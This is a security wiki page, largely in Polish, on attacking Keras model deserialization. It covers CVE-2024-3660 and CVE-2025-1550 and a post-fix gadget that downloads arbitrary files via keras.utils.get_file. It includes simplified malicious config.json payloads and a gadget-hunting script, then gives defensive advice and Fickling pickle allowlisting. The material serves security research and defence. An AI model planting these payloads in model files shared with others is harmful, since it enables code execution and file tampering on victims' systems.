# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ta strona podsumowuje praktyczne techniki eksploatacji przeciwko procesowi deserializacji modeli Keras, wyjaśnia wewnętrzną strukturę natywnego formatu .keras i powierzchnię ataku oraz dostarcza zestaw narzędzi dla badaczy do znajdowania Model File Vulnerabilities (MFVs) i post-fix gadgets.

## .keras model format internals

Plik .keras to archiwum ZIP zawierające co najmniej:
- metadata.json – informacje ogólne (np. wersja Keras)
- config.json – architekturę modelu (główna powierzchnia ataku)
- model.weights.h5 – wagi w HDF5

Plik config.json steruje rekursywną deserializacją: Keras importuje moduły, rozwiązuje klasy/funkcje i rekonstruuje warstwy/obiekty ze słowników kontrolowanych przez atakującego.

Przykładowy fragment dla obiektu warstwy Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Deserializacja wykonuje:
- Import modułów i rozwiązywanie symboli na podstawie kluczy module/class_name
- Wywołanie from_config(...) lub konstruktora z kwargs kontrolowanymi przez atakującego
- Rekurencja w głąb zagnieżdżonych obiektów (activations, initializers, constraints, etc.)

Historycznie umożliwiało to atakującemu tworzącemu config.json kontrolę nad trzema prymitywami:
- Kontrolę nad tym, które moduły są importowane
- Kontrolę nad tym, które klasy/funkcje są rozwiązywane
- Kontrolę nad kwargs przekazywanymi do konstruktorów/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Przyczyna:
- Lambda.from_config() używało python_utils.func_load(...), które base64-dekoduje i wywołuje marshal.loads() na bajtach dostarczonych przez atakującego; odmarshalowywanie w Pythonie może wykonać kod.

Pomysł exploita (uproszczony payload w config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigacja:
- Keras narzuca safe_mode=True domyślnie. Serializowane funkcje Pythona w Lambda są blokowane, chyba że użytkownik wyraźnie zrezygnuje, ustawiając safe_mode=False.

Uwagi:
- Starsze formaty (wcześniejsze zapisy HDF5) lub starsze bazy kodu mogą nie wymuszać nowoczesnych kontroli, więc ataki w stylu „downgrade” mogą nadal mieć zastosowanie, gdy ofiary używają starszych loaderów.

## CVE-2025-1550 – Dowolny import modułu w Keras ≤ 3.8

Przyczyna:
- _retrieve_class_or_fn używał nieograniczonego importlib.import_module() z ciągami modułów kontrolowanymi przez atakującego pochodzącymi z config.json.
- Wpływ: Dowolny import dowolnego zainstalowanego modułu (lub modułu podstawionego przez atakującego na sys.path). Kod uruchamiany podczas importu zostaje wykonany, a następnie następuje konstrukcja obiektu z przekazanymi przez atakującego kwargs.

Pomysł na exploit:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Ulepszenia bezpieczeństwa (Keras ≥ 3.9):
- Module allowlist: importy ograniczone do oficjalnych modułów ekosystemu: keras, keras_hub, keras_cv, keras_nlp
- Domyślny safe mode: safe_mode=True blokuje ładowanie niebezpiecznych Lambda serialized-function
- Podstawowe sprawdzanie typów: zdeserializowane obiekty muszą odpowiadać oczekiwanym typom

## Powierzchnia post-fix gadget wewnątrz allowlist

Nawet przy allowlisting i safe mode, wśród dozwolonych Keras callables nadal istnieje szeroka powierzchnia ataku. Na przykład, keras.utils.get_file może pobierać dowolne URLs do lokalizacji wybranych przez użytkownika.

Gadget przez Lambda, który odwołuje się do dozwolonej funkcji (nie zserializowany Python bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Ważne ograniczenie:
- Lambda.call() prepends the input tensor as the first positional argument when invoking the target callable. Chosen gadgets must tolerate an extra positional arg (or accept *args/**kwargs). This constrains which functions are viable.

Potencjalne skutki dopuszczonych gadżetów:
- Dowolne pobieranie/zapisywanie (path planting, config poisoning)
- Network callbacks/SSRF-like effects depending on environment
- Możliwość doprowadzenia do wykonania kodu, jeśli zapisane ścieżki są później importowane/uruchamiane lub dodane do PYTHONPATH, albo jeśli istnieje zapisywalna lokalizacja wykonująca kod przy zapisie

## Zestaw narzędzi badawczych

1) Systematyczne odkrywanie gadżetów w dozwolonych modułach

Wypisz kandydackie callables w ramach keras, keras_nlp, keras_cv, keras_hub i nadaj priorytet tym, które mają skutki uboczne dotyczące plików/sieci/procesów/środowiska.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Bezpośrednie testowanie deserializacji (archiwum .keras nie jest wymagane)

Podawaj przygotowane dicts bezpośrednio do Keras deserializers, aby poznać akceptowane params i obserwować efekty uboczne.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Sondowanie międzywersyjne i formaty

Keras występuje w wielu repozytoriach/epokach z różnymi zabezpieczeniami i formatami:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

Powtarzaj testy w różnych repozytoriach i formatach (.keras vs legacy HDF5), aby wykryć regresje lub brakujące zabezpieczenia.

## Zalecenia obronne

- Traktuj pliki modeli jako niezaufane dane wejściowe. Ładuj modele tylko ze zaufanych źródeł.
- Utrzymuj Keras zaktualizowany; używaj Keras ≥ 3.9, aby skorzystać z allowlisting i kontroli typów.
- Nie ustawiaj safe_mode=False przy ładowaniu modeli, chyba że w pełni ufasz plikowi.
- Rozważ uruchamianie deserializacji w sandboxie z minimalnymi uprawnieniami, bez dostępu do sieci wychodzącej i z ograniczonym dostępem do systemu plików.
- Wymuszaj allowlists/sygnatury dla źródeł modeli i sprawdzanie integralności tam, gdzie to możliwe.

## ML pickle import allowlisting for AI/ML models (Fickling)

Wiele formatów modeli AI/ML (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, starsze artefakty TensorFlow itp.) osadza dane Python pickle. Atakujący rutynowo nadużywają pickle GLOBAL imports i konstruktorów obiektów, aby osiągnąć RCE lub podmianę modelu podczas ładowania. Skanery oparte na czarnej liście często nie wykrywają nowych lub nieujętych niebezpiecznych importów.

Praktyczna, fail-closed strategia obronna polega na zahaczeniu deserializatora pickle Pythona i zezwoleniu tylko na przeglądany zestaw nieszkodliwych importów związanych z ML podczas unpicklingu. Trail of Bits’ Fickling implementuje tę politykę i dostarcza wyselekcjonowaną ML import allowlist zbudowaną na podstawie tysięcy publicznych pickli z Hugging Face.

Model bezpieczeństwa dla „bezpiecznych” importów (intuicje wyprowadzone z badań i praktyki): symbole importowane i używane przez pickle muszą jednocześnie:
- Nie wykonywać kodu ani nie powodować jego wykonania (np. brak obiektów reprezentujących kod, uruchamiania poleceń shell, hooków itp.)
- Nie pobierać ani nie ustawiać dowolnych atrybutów lub elementów
- Nie importować ani nie pozyskiwać referencji do innych obiektów Pythona z VM pickla
- Nie uruchamiać żadnych wtórnych deserializatorów (np. marshal, nested pickle), nawet pośrednio

Włącz ochrony Fickling jak najwcześniej podczas uruchamiania procesu, tak aby wszystkie ładowania pickle wykonywane przez frameworki (torch.load, joblib.load, itp.) były sprawdzane:
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Wskazówki operacyjne:
- Możesz tymczasowo wyłączyć/ponownie włączyć hooks tam, gdzie to potrzebne:
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
Jeśli zablokowano sprawdzony model, rozszerz allowlist dla swojego środowiska po przejrzeniu symboli:
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling udostępnia też ogólne runtime guards, jeśli wolisz bardziej granulowaną kontrolę:
- fickling.always_check_safety() aby wymusić sprawdzenia dla wszystkich wywołań pickle.load()
- with fickling.check_safety(): dla wymuszania w określonym zakresie
- fickling.load(path) / fickling.is_likely_safe(path) do jednorazowych kontroli

- W miarę możliwości preferuj formaty modeli inne niż pickle (np. SafeTensors). Jeśli musisz akceptować pickle, uruchamiaj ładowarki z najmniejszymi uprawnieniami, bez egressu sieciowego, i egzekwuj allowlistę.

Ta strategia oparta na allowliście dowodnie blokuje typowe ścieżki exploitów pickle w ML, zachowując przy tym wysoką kompatybilność. W benchmarku ToB, Fickling oznaczył 100% syntetycznych złośliwych plików i dopuścił ~99% czystych plików z czołowych repozytoriów Hugging Face.

## Źródła

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [Trail of Bits blog – Fickling’s new AI/ML pickle file scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [Fickling – Securing AI/ML environments (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [Fickling pickle scanning benchmark corpus](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [Picklescan](https://github.com/mmaitre314/picklescan), [ModelScan](https://github.com/protectai/modelscan), [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [Sleepy Pickle attacks background](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [SafeTensors project](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
